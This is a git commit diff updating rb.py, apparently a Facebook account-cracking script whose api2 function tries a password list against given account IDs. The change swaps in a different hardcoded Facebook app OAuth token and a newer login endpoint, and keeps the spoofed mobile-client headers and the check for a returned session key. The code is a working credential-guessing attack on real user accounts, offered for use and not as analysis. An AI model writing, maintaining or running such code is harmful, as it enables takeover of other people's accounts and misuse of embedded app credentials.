6903b7f1d31ea3c6301176c2a4d83b77c5f3a9d5
rbrahul24 <119988259+rbrahul24@users.noreply.github.com>
2023-02-26 20:00:47 +0545

    Update rb.py

--- rb.py
+++ rb.py
@@ -667,7 +667,7 @@ def api2(ids,names,passlist):
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-type':'mobile.CTRadioAccessTechnologyLTE',
-                                        'Authorization':'OAuth 1282901019105773|4c696bda76ebcb9000b20470774b0505',
+                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-bandwidth':str(random.randint(20000000, 30000000)),
@@ -675,7 +675,7 @@ def api2(ids,names,passlist):
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = 'https://b-api.facebook.com/method/auth.login'
+                                url = 'https://b-graph.facebook.com/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
